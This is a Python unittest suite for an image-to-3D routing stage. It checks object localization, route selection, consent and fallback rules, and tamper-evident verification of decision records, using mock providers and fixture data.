"""Offline stage-zero contracts. Fixture advisories are never production defaults."""
from __future__ import annotations

import copy
import hashlib
import io
import json
import os
from pathlib import Path
import struct
import subprocess
import threading
from textwrap import dedent
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from unittest.mock import Mock, patch

FORGE = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(FORGE))
sys.path.insert(0, str(FORGE / "_shared"))
from decision_control import DecisionController, DecisionError, canonical_digest
from stage0_route.discovery import Discovery, EDGES, JEV_EDGE, read_only_probes, character_three_facts
from stage0_route.images import crop, decode, png, prepare_reference
from stage0_route.route import Router, main
from stage0_route.storage import RouteError, atomic_write, encode, snapshot


class FixtureDiscovery:
    """Explicitly injected trusted test boundary; not used by the executable CLI."""
    def __init__(self, workspace, candidates=(), status="present"):
        self.workspace = workspace
        self.candidates = list(candidates)
        self.version = "fixture-harness"
        self.probes = []
        self.degraded = False
        self.availability = Mock(return_value={"status": status})

    def enumerate(self):
        return copy.deepcopy(self.candidates), []

    def candidate(self, name="interior", *, output="3d-object", gate=True, deps=None, cost="local"):
        card = {"kind": "img2.route-card", "version": 1, "outputKind": output,
                "requires": {}, "notFor": {}, "costClass": cost,
                "deps": [{"probe": k} for k in (deps or {})], "display": {"appliesTo": "Test fixture"}}
        return {"id": name + ":" + "a" * 64, "provider": name, "resolvedSha": "b" * 40,
                "card": card, "binding": snapshot(self.workspace, "route-card", card),
                "providerStatus": "answered", "dependencies": deps or {}, "blockingGateProduced": gate}


class Stage0RouteTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.workspace = Path(self.temp.name).resolve()
        self.reference = self.workspace / "reference.png"
        self.reference.write_bytes(png(16, 16, 3, bytes(range(256)) * 3))
        self.controller = DecisionController(self.workspace, "run-1", clock=lambda: 1000)
        self.discovery = FixtureDiscovery(self.workspace)
        self.grant = {"granted": True, "purposes": ["routing", "build-strategy", "quality-review", "repair"],
                      "sha256": "c" * 64, "tokenBudget": 2_000_000}
        self.consent = lambda: copy.deepcopy(self.grant)
        self.provider = Mock(side_effect=self.answer)
        self.fallback = Mock(side_effect=lambda ctx: self.answer(ctx, model="host-fixture"))

    @staticmethod
    def proposals(count=1):
        return {"kind": "img2.object-proposals", "version": 1, "objects": [
            {"objectId": f"object-{i}", "label": f"label-{i}", "role": "prop",
             "approxBox": [.1, .1, .6, .9], "observations": {"flatness": "volumetric"}}
            for i in range(count)]}

    @staticmethod
    def answer(context, *, model="jev-1.14.0", probability=1, confidence=1, fits=1,
               visible=1, missing=0, bounds=None, choice=None):
        ids = [c["id"] for c in context["candidates"]]
        answers = {}
        if ids:
            selection = choice or ids[0]
            probabilities = {key: (probability if key == selection else (1 - probability) / (len(ids) - 1)) for key in ids}
            answers = {"selection": {"type": "choice", "choice": selection,
                                      "probabilities": probabilities, "confidence": confidence},
                       "anyFits": {"type": "noul", "noul": fits}}
        if "decomposition" in context["requirements"]:
            answers["missingObjects"] = {"type": "noul", "noul": missing}
            for obj in context["requirements"]["decomposition"]["objects"]:
                left, top, right, bottom = bounds or obj["approxBox"]
                answers[f"object:{obj['id']}:visible"] = {"type": "noul", "noul": visible}
                answers[f"object:{obj['id']}:box"] = {"type": "box", "confidence": .9,
                    "box": {"left": left, "top": top, "right": right, "bottom": bottom}}
        return {"kind": "img2.decision-advisory", "version": 1, "group": "routing",
                "subject": copy.deepcopy(context["subject"]), "contextDigest": canonical_digest(context),
                "model": model, "answers": answers, "usage": {"input_tokens": 20, "output_tokens": 10}}

    def router(self, **kwargs):
        return Router(self.workspace, "run-1", controller=self.controller, discovery=self.discovery,
                      provider=kwargs.get("provider", self.provider), fallback=kwargs.get("fallback", self.fallback),
                      consent=kwargs.get("consent", self.consent), second_proposals=kwargs.get("second_proposals"),
                      second_proposal_binding=kwargs.get("second_proposal_binding"))

    def route(self, **kwargs):
        objects = kwargs.pop("objects", self.proposals())
        return self.router().route(image="reference.png", objects=objects, **kwargs)

    def test_localization_primitives_reach_ordinary_route_without_choice(self):
        result = self.route()
        self.assertEqual(result["decision"]["phase"], "decided")
        row = result["decision"]["objects"][0]
        self.assertEqual((row["status"], row["selected"]), ("resolved", ["base:generic"]))
        localization, routing = [call.args[0] for call in self.provider.call_args_list]
        self.assertEqual(localization["candidates"], [])
        self.assertEqual(set(self.answer(localization)["answers"]),
                         {"missingObjects", "object:object-0:visible", "object:object-0:box"})
        self.assertTrue(routing["candidates"])
        self.assertIsNone(row["consultations"][0]["answer"])
        self.assertEqual(row["consultations"][1]["answer"]["anyFitsNoul"], 1)
        self.assertNotIn("noneFitsNoul", row["consultations"][1]["answer"])
        self.assertEqual(self.router().verify_decision(result["decisionRef"]), result["decision"])

    def test_valid_absence_is_answered_then_dropped_without_route_selection(self):
        self.provider.side_effect = lambda ctx: self.answer(ctx,
            visible=0 if ctx["subject"]["objectId"] == "object-1" else 1)
        result = self.route(objects=self.proposals(2))
        self.assertEqual(result["decision"]["phase"], "decided")
        self.assertEqual([row["status"] for row in result["decision"]["objects"]], ["resolved", "dropped"])
        absent = result["decision"]["objects"][1]["consultations"][0]
        record = json.loads((self.workspace / absent["decisionRef"]).read_bytes())
        self.assertEqual((record["status"], record["reasonCode"]), ("answered", "answered"))
        self.assertEqual(result["decision"]["objects"][1]["reasonCode"], "object-not-visible")
        self.assertEqual(self.provider.call_count, 3)
        self.fallback.assert_not_called()
        self.assertEqual(self.router().verify_decision(result["decisionRef"]), result["decision"])

    def test_each_localization_sees_all_current_inventory_not_only_its_target(self):
        proposals = self.proposals(2)
        result = self.route(objects=proposals)
        expected = [{"id": obj["objectId"], "label": obj["label"], "role": obj["role"],
                     "approxBox": obj["approxBox"]} for obj in proposals["objects"]]
        for call in self.provider.call_args_list[:2]:
            decomposition = call.args[0]["requirements"]["decomposition"]
            self.assertEqual(decomposition["inventory"], expected)
            self.assertEqual(len(decomposition["objects"]), 1)
        self.assertEqual(self.router().verify_decision(result["decisionRef"]), result["decision"])

    def test_file_backed_second_proposals_reject_wrong_or_incomplete_bindings(self):
        source = self.workspace / "second.json"
        source.write_bytes(b'{"objects":[]}')
        good = {"role": "second-proposal-source", "path": "second.json",
                "sha256": hashlib.sha256(source.read_bytes()).hexdigest()}
        for bad in ({key: value for key, value in good.items() if key != "sha256"},
                    dict(good, role="object-proposals"), dict(good, sha256="0" * 64),
                    dict(good, path="../second.json")):
            with self.subTest(binding=bad), self.assertRaises(RouteError):
                self.router(second_proposals=Mock(), second_proposal_binding=bad)
        self.provider.assert_not_called()

    def test_changed_second_source_cannot_resume_or_verify_old_round_two(self):
        additions = self.proposals()
        additions["objects"][0].update(objectId="object-new", label="new-prop")
        source = self.workspace / "second.json"
        source.write_bytes(encode(additions))
        source_binding = {"role": "second-proposal-source", "path": "second.json",
                          "sha256": hashlib.sha256(source.read_bytes()).hexdigest()}
        callback = Mock(return_value=additions)
        self.provider.side_effect = lambda ctx: self.answer(ctx,
            missing=.8 if ctx["subject"]["objectId"] == "object-0" else 0)
        router = self.router(second_proposals=callback, second_proposal_binding=source_binding)
        first = router.route(image="reference.png", objects=self.proposals())
        self.assertEqual(router.verify_decision(first["decisionRef"]), first["decision"])
        for call in self.provider.call_args_list:
            self.assertIn({"role": "second-proposal-source", "sha256": source_binding["sha256"]},
                          call.args[0]["bindings"])
            self.assertNotIn("path", call.args[0]["bindings"][0])
        second_localization = self.provider.call_args_list[1].args[0]["requirements"]["decomposition"]
        self.assertEqual([obj["id"] for obj in second_localization["inventory"]], ["object-0", "object-new"])
        self.assertEqual([obj["id"] for obj in second_localization["objects"]], ["object-new"])
        source.write_bytes(encode(additions) + b"\n")
        with self.assertRaises(RouteError) as caught:
            router.route(image="reference.png", objects=self.proposals())
        self.assertEqual(caught.exception.reason_code, "stale-second-proposal-source")
        with self.assertRaises(DecisionError) as caught:
            self.router().verify_decision(first["decisionRef"])
        self.assertEqual(caught.exception.reason_code, "stale-evidence")
        self.assertEqual(callback.call_count, 1)
        refreshed = dict(source_binding, sha256=hashlib.sha256(source.read_bytes()).hexdigest())
        second = self.router(second_proposals=callback, second_proposal_binding=refreshed).route(
            image="reference.png", objects=self.proposals())
        self.assertEqual(second["decision"]["revision"], first["decision"]["revision"] + 1)
        self.assertNotEqual(second["decision"]["baseInputsDigest"], first["decision"]["baseInputsDigest"])
        self.assertEqual(callback.call_count, 2)
        self.assertEqual(self.provider.call_count, 8)
        self.assertEqual(self.router().verify_decision(second["decisionRef"]), second["decision"])

    def test_second_source_is_required_in_immutable_decision_proof(self):
        source = self.workspace / "second.json"
        source.write_bytes(b"host-supplied source")
        source_binding = {"role": "second-proposal-source", "path": "second.json",
                          "sha256": hashlib.sha256(source.read_bytes()).hexdigest()}
        result = self.router(second_proposal_binding=source_binding).route(
            image="reference.png", objects=self.proposals())
        for bad in (None, dict(source_binding, role="object-proposals"),
                    {key: value for key, value in source_binding.items() if key != "sha256"}):
            forged = copy.deepcopy(result["decision"])
            if bad is None:
                forged.pop("secondProposalBinding")
            else:
                forged["secondProposalBinding"] = bad
            raw = encode(forged)
            ref = ".img2threejs/route/decision-" + hashlib.sha256(raw).hexdigest() + ".json"
            atomic_write(self.workspace, ref, raw, immutable=True)
            with self.subTest(binding=bad), self.assertRaises(RouteError) as caught:
                self.router().verify_decision(ref)
            self.assertEqual(caught.exception.reason_code, "second-proposal-binding-mismatch")

    def test_proof_rejects_authenticated_localization_hiding_other_inventory_entries(self):
        router = self.router()
        consult = router._consult
        def hide_other(context, *, route_round):
            if "decomposition" in context["requirements"]:
                target = context["subject"]["objectId"]
                context["requirements"]["decomposition"]["inventory"] = [
                    item for item in context["requirements"]["decomposition"]["inventory"] if item["id"] == target]
            return consult(context, route_round=route_round)
        router._consult = hide_other
        result = router.route(image="reference.png", objects=self.proposals(2))
        self.assertEqual(result["decision"]["phase"], "decided")
        with self.assertRaises(RouteError) as caught:
            router.verify_decision(result["decisionRef"])
        self.assertEqual(caught.exception.reason_code, "proposal-mismatch")

    def test_known_empty_second_proposals_stay_refused_and_do_not_replay_callback(self):
        empty = {"kind": "img2.object-proposals", "version": 1, "objects": []}
        callback = Mock(return_value=empty)
        self.provider.side_effect = lambda ctx: self.answer(ctx, missing=.8)
        router = self.router(second_proposals=callback)
        for _ in range(2):
            result = router.route(image="reference.png", objects=self.proposals())
            self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], "second-proposals-empty")
            self.assertEqual(len(result["decision"]["proposalRounds"]), 2)
            self.assertTrue(result["decision"]["proposalRounds"][0]["missingObjectDecisionIds"])
            returned = result["decision"]["proposalRounds"][1]["proposal"]
            self.assertEqual(json.loads((self.workspace / returned["path"]).read_bytes()), empty)
        self.assertEqual(callback.call_count, 1)
        self.assertEqual(self.provider.call_count, 1)

    def test_explicit_2d_is_whole_image_and_has_no_decomposition_or_3d_downgrade(self):
        unavailable = self.route(expected_output="2d")
        self.assertEqual(unavailable["decision"]["suspendedAt"]["reasonCode"], "explicit-2d-unavailable")
        self.provider.assert_not_called()
        self.discovery.candidates = [self.discovery.candidate("pixi2d", output="2d-scene")]
        result = self.route(expected_output="2d", objects={"not": "a proposal inventory"})
        decision = result["decision"]
        self.assertEqual(decision["phase"], "decided")
        self.assertTrue(decision["skipComposition"])
        self.assertFalse(decision["executionAuthorized"])
        self.assertEqual(len(decision["objects"]), 1)
        self.assertEqual(self.provider.call_count, 1)
        self.assertEqual(self.provider.call_args.args[0]["subject"]["passId"], "routing")
        self.assertTrue(decision["objects"][0]["selected"][0].startswith("pixi2d:"))

    def test_3d_excludes_pixi_and_binds_real_crop_and_safe_handles(self):
        self.discovery.candidates = [self.discovery.candidate("pixi2d", output="2d-scene")]
        result = self.route()
        row = result["decision"]["objects"][0]
        self.assertEqual(row["selected"], ["base:generic"])
        self.assertTrue(any(r["reasonCode"] == "output-kind-mismatch" for r in row["rejected"]))
        self.assertTrue((self.workspace / row["reference"]["path"]).is_file())
        context = self.provider.call_args.args[0]
        self.assertNotIn("path", context["bindings"][0])
        self.assertTrue(all(c["id"].startswith("candidate-") for c in context["candidates"]))
        self.assertEqual(context["requirements"]["request"]["expectedOutput"], "3d")

    def test_missing_dependency_and_gate_are_never_offered(self):
        self.discovery.candidates = [self.discovery.candidate("interior", deps={"blender>=4.3": False}),
                                     self.discovery.candidate("character", gate=False)]
        result = self.route()
        reasons = {r["reasonCode"] for r in result["decision"]["objects"][0]["rejected"]}
        self.assertIn("dependency-missing:blender>=4.3", reasons)
        self.assertIn("no-blocking-gate", reasons)
        self.assertEqual(result["decision"]["objects"][0]["eligible"], ["base:generic"])

    def test_uncertainty_is_best_of_n_without_model_override(self):
        self.discovery.candidates = [self.discovery.candidate()]
        def uncertain(context):
            return self.answer(context, probability=.6 if context["subject"]["passId"] == "routing" else 1)
        self.provider.side_effect = uncertain
        row = self.route()["decision"]["objects"][0]
        self.assertEqual(row["status"], "best-of-n")
        self.assertEqual(len(row["selected"]), 2)
        self.fallback.assert_not_called()

    def test_same_output_candidates_keep_trusted_route_identity_and_actual_object_image(self):
        self.discovery.candidates = [self.discovery.candidate(output="3d-object")]
        result = self.route()
        context = self.provider.call_args.args[0]
        self.assertEqual({c["routeId"] for c in context["candidates"]}, {"interior", "base-generic"})
        self.assertEqual({c["outputKind"] for c in context["candidates"]}, {"3d-object"})
        self.assertTrue(all(c["id"].startswith("candidate-") for c in context["candidates"]))
        self.assertEqual(context["observations"]["images"], [{"role": "object-crop", "asset": "object-crop"}])
        image = next(b for b in context["bindings"] if b["role"] == "object-crop")
        self.assertEqual(image["sha256"], result["decision"]["objects"][0]["reference"]["sha256"])
        self.assertNotIn("path", image)
        self.assertEqual(self.router().verify_decision(result["decisionRef"]), result["decision"])

    def test_verifier_rechecks_current_consent_without_provider_call(self):
        result = self.route()
        self.grant["sha256"] = "d" * 64
        with self.assertRaises(DecisionError) as caught:
            self.router().verify_decision(result["decisionRef"])
        self.assertEqual(caught.exception.reason_code, "consent-changed")
        self.assertEqual(self.provider.call_count, 2)

    def test_none_fits_is_request_input_not_outage(self):
        self.provider.side_effect = lambda ctx: self.answer(ctx, fits=0)
        result = self.route()
        self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], "none-fits")
        self.fallback.assert_not_called()

    def test_login_missing_and_rejected_suspend_without_fallback(self):
        self.discovery.availability.return_value = {"status": "credential-missing"}
        result = self.route()
        self.assertEqual(result["decision"]["objects"][0]["loginCommand"], "img2-jev login")
        self.provider.assert_not_called()
        self.fallback.assert_not_called()
        self.discovery.availability.return_value = {"status": "present"}
        self.provider.side_effect = DecisionError("credential-rejected")
        result = self.route()
        self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], "credential-rejected")
        self.fallback.assert_not_called()

    def test_real_controller_outage_proof_is_required_for_fallback(self):
        self.discovery.availability.return_value = {"status": "availability-unproven"}
        self.route()
        self.fallback.assert_not_called()
        self.discovery.availability.return_value = {"status": "capability-unavailable"}
        decision = self.route()["decision"]
        self.assertEqual(decision["phase"], "decided")
        self.assertTrue(decision["objects"][0]["decider"].startswith("model:"))
        self.provider.assert_not_called()
        self.assertEqual(self.fallback.call_count, 2)

    def test_absent_trusted_adapters_and_consent_do_not_synthesize_answers(self):
        router = self.router(provider=None, fallback=None)
        result = router.route(image="reference.png", objects=self.proposals())
        self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], "provider-unbound")
        router = self.router(consent=None)
        result = router.route(image="reference.png", objects=self.proposals())
        self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], "consent-unproven")
        self.fallback.assert_not_called()

    def test_objects_resume_independently_and_changed_observation_only_reroutes_one(self):
        objects = self.proposals(2)
        first = self.route(objects=objects)
        self.assertEqual(self.provider.call_count, 4)
        again = self.route(objects=objects)
        self.assertEqual(self.provider.call_count, 4)
        self.assertEqual(first["decision"]["revision"], again["decision"]["revision"])
        objects["objects"][0]["observations"]["stylization"] = "stylized"
        changed = self.route(objects=objects)
        self.assertEqual(self.provider.call_count, 6)
        self.assertEqual([o["revision"] for o in changed["decision"]["objects"]], [2, 1])
        self.assertEqual(changed["decision"]["revision"], first["decision"]["revision"] + 1)

    def test_changed_card_starts_new_revision(self):
        first = self.route()
        self.discovery.candidates = [self.discovery.candidate()]
        second = self.route()
        self.assertEqual(second["decision"]["revision"], first["decision"]["revision"] + 1)
        self.assertEqual(self.provider.call_count, 4)

    def test_paid_route_needs_separate_action_consent(self):
        self.discovery.candidates = [self.discovery.candidate(cost="licensed")]
        result = self.route(explicit_route="interior")
        self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], "route-action-consent-required")
        self.assertFalse(result["decision"]["executionAuthorized"])

    def test_missing_second_round_adapter_requests_input_without_inventing_proposals(self):
        self.provider.side_effect = lambda ctx: self.answer(ctx, missing=.8)
        result = self.route()
        self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], "second-proposal-adapter-required")
        self.assertEqual(self.provider.call_count, 1)
        self.fallback.assert_not_called()

    def test_no_objects_invalid_group_and_unsupported_reference_request_input(self):
        self.assertEqual(self.route(objects=None)["decision"]["suspendedAt"]["reasonCode"], "object-proposals-required")
        proposals = self.proposals()
        proposals["objects"][0]["instanceOf"] = "../chair"
        self.assertEqual(self.route(objects=proposals)["decision"]["suspendedAt"]["reasonCode"], "invalid-instance-group")
        self.reference.write_bytes(b"not a PNG")
        self.assertEqual(self.route()["decision"]["suspendedAt"]["reasonCode"], "reference-conversion-required")
        self.provider.assert_not_called()

    def test_fresh_verifier_rechecks_evidence_without_consulting(self):
        result = self.route()
        fresh = Router(self.workspace, "run-1", discovery=self.discovery, consent=self.consent)
        verified = fresh.verify_decision(result["decisionRef"])
        self.assertEqual(verified, result["decision"])
        self.assertEqual(self.provider.call_count, 2)
        self.reference.write_bytes(png(16, 16, 3, b"\0" * (16 * 16 * 3)))
        with self.assertRaises(DecisionError) as caught:
            fresh.verify_decision(result["decisionRef"])
        self.assertEqual(caught.exception.reason_code, "stale-evidence")

    def test_wrapper_selection_is_not_authority(self):
        result = self.route()
        forged = copy.deepcopy(result["decision"])
        forged["objects"][0]["selected"] = ["unapproved-provider"]
        data = encode(forged)
        ref = ".img2threejs/route/decision-" + hashlib.sha256(data).hexdigest() + ".json"
        atomic_write(self.workspace, ref, data, immutable=True)
        with self.assertRaises(RouteError) as caught:
            self.router().verify_decision(ref)
        self.assertEqual(caught.exception.reason_code, "route-selection-mismatch")

    def test_symlink_and_traversal_evidence_is_refused(self):
        (self.workspace / "link.png").symlink_to(self.reference)
        for reference in ("link.png", "../reference.png", str(self.reference)):
            with self.subTest(reference=reference), self.assertRaises(RouteError):
                self.router().route(image=reference, objects=self.proposals())

    def test_crop_is_real_deterministic_pixels_with_transform(self):
        decoded = decode(self.reference.read_bytes())
        a, transform = crop(self.workspace, decoded, [.25, .25, .75, .75])
        b, _ = crop(self.workspace, decoded, [.25, .25, .75, .75])
        self.assertEqual(a, b)
        cropped = decode((self.workspace / a["path"]).read_bytes())
        self.assertEqual(cropped[:3], (10, 10, 3))
        self.assertEqual(transform["origin"], [3, 3])
        self.assertEqual(cropped[3][:3], decoded[3][(3 * 16 + 3) * 3:(3 * 16 + 3) * 3 + 3])


    def test_second_round_is_exactly_once_and_replayed_without_host_callback(self):
        additions = self.proposals()
        additions["objects"][0].update(objectId="object-new", label="new-prop")
        callback = Mock(return_value=additions)
        self.provider.side_effect = lambda ctx: self.answer(ctx,
            missing=.8 if ctx["subject"]["objectId"] == "object-0" else 0)
        router = self.router(second_proposals=callback)
        first = router.route(image="reference.png", objects=self.proposals())
        self.assertEqual(first["decision"]["phase"], "decided")
        self.assertEqual([r["round"] for r in first["decision"]["proposalRounds"]], [1, 2])
        self.assertEqual([r["objectId"] for r in first["decision"]["objects"]], ["object-0", "object-new"])
        self.assertEqual(callback.call_count, 1)
        self.assertEqual(self.provider.call_count, 4)
        second = router.route(image="reference.png", objects=self.proposals())
        self.assertEqual(callback.call_count, 1)
        self.assertEqual(self.provider.call_count, 4)
        self.assertEqual(second["decision"]["inputsDigest"], first["decision"]["inputsDigest"])
        self.assertEqual(router.verify_decision(second["decisionRef"]), second["decision"])

    def test_second_round_missing_objects_never_starts_a_third_round(self):
        additions = self.proposals()
        additions["objects"][0].update(objectId="object-new", label="new-prop")
        callback = Mock(return_value=additions)
        self.provider.side_effect = lambda ctx: self.answer(ctx, missing=.8)
        router = self.router(second_proposals=callback)
        result = router.route(image="reference.png", objects=self.proposals())
        self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], "missing-objects-after-round-limit")
        self.assertEqual(len(result["decision"]["proposalRounds"]), 2)
        self.assertEqual(callback.call_count, 1)
        self.assertEqual(self.provider.call_count, 2)
        router.route(image="reference.png", objects=self.proposals())
        self.assertEqual(callback.call_count, 1)
        self.assertEqual(self.provider.call_count, 2)

    def test_second_round_over_limit_preserves_proposal_snapshot_and_requests_prioritisation(self):
        additions = self.proposals()
        additions["objects"][0].update(objectId="object-new", label="new-prop")
        self.provider.side_effect = lambda ctx: self.answer(ctx,
            missing=.8 if ctx["subject"]["objectId"] == "object-0" else 0)
        callback = Mock(return_value=additions)
        result = self.router(second_proposals=callback).route(image="reference.png", objects=self.proposals(12))
        decision = result["decision"]
        self.assertEqual(decision["suspendedAt"]["reasonCode"], "object-prioritisation-required")
        self.assertEqual(len(decision["objects"]), 13)
        last = decision["proposalRounds"][-1]["proposal"]
        self.assertEqual(json.loads((self.workspace / last["path"]).read_bytes()), additions)
        self.assertEqual(callback.call_count, 1)
        self.assertEqual(self.provider.call_count, 12)

    def test_jev_crop_choice_binds_two_real_crops_and_resolves_disagreement(self):
        located = [.8, .8, 1, 1]
        def provider(context):
            if context["subject"]["passId"] == "decomposition":
                return self.answer(context, bounds=located)
            return self.answer(context, choice="jev-crop" if context["subject"]["passId"] == "crop-choice" else None)
        self.provider.side_effect = provider
        result = self.route()
        self.assertEqual(result["decision"]["phase"], "decided")
        row = result["decision"]["objects"][0]
        self.assertEqual(row["reconciliation"]["selectedBox"], located)
        self.assertFalse(row["reconciliation"]["lowConfidence"])
        choice_context = self.provider.call_args_list[1].args[0]
        self.assertEqual(choice_context["subject"]["passId"], "crop-choice")
        self.assertEqual({b["role"] for b in choice_context["bindings"]} & {"model-crop", "jev-crop"},
                         {"model-crop", "jev-crop"})
        self.assertEqual(self.provider.call_count, 3)
        self.fallback.assert_not_called()
        self.assertEqual(self.router().verify_decision(result["decisionRef"]), result["decision"])

    def test_uncertain_crop_keeps_jev_box_flagged_and_never_calls_model_override(self):
        located = [.8, .8, 1, 1]
        self.provider.side_effect = lambda ctx: self.answer(ctx,
            bounds=located if ctx["subject"]["passId"] == "decomposition" else None,
            probability=.6 if ctx["subject"]["passId"] == "crop-choice" else 1)
        result = self.route()
        self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], "decomposition-low-confidence")
        inventory = json.loads((self.workspace / result["decision"]["inventoryRef"]).read_bytes())
        self.assertEqual(inventory["objects"][0]["box"], located)
        self.assertTrue(inventory["objects"][0]["lowConfidence"])
        self.assertEqual(self.provider.call_count, 2)
        self.fallback.assert_not_called()

    def test_login_failure_during_crop_choice_suspends_same_object(self):
        def provider(context):
            if context["subject"]["passId"] == "crop-choice":
                raise DecisionError("credential-rejected")
            return self.answer(context, bounds=[.8, .8, 1, 1])
        self.provider.side_effect = provider
        result = self.route()
        self.assertEqual(result["decision"]["suspendedAt"]["reasonCode"], "credential-rejected")
        self.assertEqual(result["decision"]["objects"][0]["loginCommand"], "img2-jev login")
        self.fallback.assert_not_called()

    def test_instances_route_once_and_keep_independent_overlapping_placements(self):
        proposals = self.proposals(2)
        for obj in proposals["objects"]:
            obj.update(instanceOf="chairs", label="chair")
        result = self.route(objects=proposals)
        rows = result["decision"]["objects"]
        self.assertEqual(self.provider.call_count, 3)
        self.assertEqual([r["routeObjectId"] for r in rows], ["object-0", "object-0"])
        self.assertEqual([r["execution"]["placementOnly"] for r in rows], [False, True])
        inventory = json.loads((self.workspace / result["decision"]["inventoryRef"]).read_bytes())
        self.assertEqual([o["objectId"] for o in inventory["objects"]], ["object-0", "object-1"])
        self.assertTrue(all(o["ownerRoute"] == "base:generic" for o in inventory["objects"]))
        # The composer resolves each row to the child whose artifact owns it; both
        # instances are placements of the one leader that is actually built.
        self.assertEqual([o["artifactObjectId"] for o in inventory["objects"]],
                         ["object-0", "object-0"])
        self.assertEqual(self.router().verify_decision(result["decisionRef"]), result["decision"])

    def test_instance_route_eligibility_is_intersection_not_first_instance(self):
        candidate = self.discovery.candidate()
        candidate["card"]["requires"] = {"observations": {"flatness": ["volumetric"]}}
        candidate["binding"] = snapshot(self.workspace, "route-card", candidate["card"])
        self.discovery.candidates = [candidate]
        proposals = self.proposals(2)
        for obj in proposals["objects"]:
            obj["instanceOf"] = "same-prop"
        proposals["objects"][1]["observations"]["flatness"] = "flat"
        result = self.route(objects=proposals)
        rows = result["decision"]["objects"]
        self.assertIn(candidate["id"], rows[0]["eligible"])
        self.assertNotIn(candidate["id"], rows[1]["eligible"])
        self.assertEqual(rows[0]["groupEligible"], ["base:generic"])
        self.assertEqual(rows[1]["selected"], ["base:generic"])
        self.assertEqual(self.router().verify_decision(result["decisionRef"]), result["decision"])

    def test_maximum_counts_distinct_route_groups_not_placement_instances(self):
        proposals = self.proposals(13)
        for obj in proposals["objects"]:
            obj["instanceOf"] = "chairs"
        self.assertEqual(len(Router._objects(proposals)), 13)
        with self.assertRaises(RouteError):
            Router._objects(self.proposals(13))

    def test_verifier_accounts_for_dropped_and_merged_proposals(self):
        proposals = self.proposals(3)
        proposals["objects"][1]["label"] = proposals["objects"][0]["label"]
        self.provider.side_effect = lambda ctx: self.answer(ctx,
            visible=0 if ctx["subject"]["objectId"] == "object-2" else 1)
        result = self.route(objects=proposals)
        self.assertEqual([r["status"] for r in result["decision"]["objects"]], ["resolved", "merged", "dropped"])
        self.assertEqual(self.router().verify_decision(result["decisionRef"]), result["decision"])
        forged = copy.deepcopy(result["decision"])
        forged["objects"].pop()
        raw = encode(forged)
        path = ".img2threejs/route/decision-" + hashlib.sha256(raw).hexdigest() + ".json"
        atomic_write(self.workspace, path, raw, immutable=True)
        with self.assertRaises(RouteError):
            self.router().verify_decision(path)

    def test_round_seal_rejects_forged_complete_looking_subset(self):
        result = self.route(objects=self.proposals(2))
        forged = copy.deepcopy(result["decision"])
        proposal_value = self.proposals()
        proposal_ref = snapshot(self.workspace, "object-proposals", proposal_value)
        inputs = json.loads((self.workspace / forged["inputsRef"]).read_bytes())
        inputs.pop("proposalRounds")
        inputs["proposals"] = proposal_value["objects"]
        initial_ref = snapshot(self.workspace, "routing-inputs", inputs)
        rounds = [{"round": 1, "proposal": proposal_ref, "parentRoundSha256": None,
                   "triggerDecisionIds": [], "missingObjectDecisionIds": []}]
        inputs["proposalRounds"] = rounds
        input_ref = snapshot(self.workspace, "routing-inputs", inputs)
        inventory = json.loads((self.workspace / forged["inventoryRef"]).read_bytes())
        inventory["objects"] = inventory["objects"][:1]
        inventory_ref = snapshot(self.workspace, "object-inventory", inventory)
        forged.update(objects=forged["objects"][:1], proposalRef=proposal_ref["path"],
            proposalSha256=proposal_ref["sha256"], proposalRounds=rounds,
            baseInputsDigest=initial_ref["sha256"], inputsRef=input_ref["path"], inputsDigest=input_ref["sha256"],
            inventoryRef=inventory_ref["path"], inventorySha256=inventory_ref["sha256"])
        raw = encode(forged)
        path = ".img2threejs/route/decision-" + hashlib.sha256(raw).hexdigest() + ".json"
        atomic_write(self.workspace, path, raw, immutable=True)
        with self.assertRaises(RouteError) as caught:
            self.router().verify_decision(path)
        self.assertEqual(caught.exception.reason_code, "proposal-round-seal-mismatch")

    def test_second_round_callback_crash_never_reexecutes_ambiguous_attempt(self):
        callback = Mock(side_effect=RuntimeError("host interruption"))
        self.provider.side_effect = lambda ctx: self.answer(ctx, missing=.8)
        router = self.router(second_proposals=callback)
        first = router.route(image="reference.png", objects=self.proposals())
        self.assertEqual(first["decision"]["suspendedAt"]["reasonCode"], "second-proposal-error")
        resumed = router.route(image="reference.png", objects=self.proposals())
        self.assertEqual(resumed["decision"]["suspendedAt"]["reasonCode"], "ambiguous-proposal-attempt")
        self.assertEqual(callback.call_count, 1)
        self.assertEqual(self.provider.call_count, 1)

    def test_instance_group_can_span_two_authenticated_proposal_rounds(self):
        initial = self.proposals()
        initial["objects"][0].update(instanceOf="chairs", label="chair")
        additions = self.proposals()
        additions["objects"][0].update(objectId="new-chair", instanceOf="chairs", label="chair")
        callback = Mock(return_value=additions)
        self.provider.side_effect = lambda ctx: self.answer(ctx,
            missing=.8 if ctx["subject"]["objectId"] == "object-0" else 0)
        router = self.router(second_proposals=callback)
        result = router.route(image="reference.png", objects=initial)
        self.assertEqual(self.provider.call_count, 3)
        self.assertEqual([r["routingRound"] for r in result["decision"]["objects"]], [2, 2])
        self.assertEqual([r["routeObjectId"] for r in result["decision"]["objects"]], ["object-0", "object-0"])
        self.assertEqual(router.verify_decision(result["decisionRef"]), result["decision"])

    def test_provider_factory_receives_original_and_returns_per_context_projection_callback(self):
        factory = Mock()
        originals = []
        def build(original):
            originals.append(copy.deepcopy(original))
            self.assertTrue(all("path" in binding for binding in original["bindings"]))
            def provider(projected):
                self.assertTrue(all("path" not in binding for binding in projected["bindings"]))
                detached = copy.deepcopy(original)
                detached["bindings"] = [{k: v for k, v in b.items() if k != "path"} for b in detached["bindings"]]
                self.assertEqual(detached, projected)
                return self.answer(projected)
            return provider
        factory.provider.side_effect = build
        router = Router(self.workspace, "run-1", controller=self.controller, discovery=self.discovery,
                        provider_factory=factory, provider=self.provider, fallback=self.fallback, consent=self.consent)
        result = router.route(image="reference.png", objects=self.proposals())
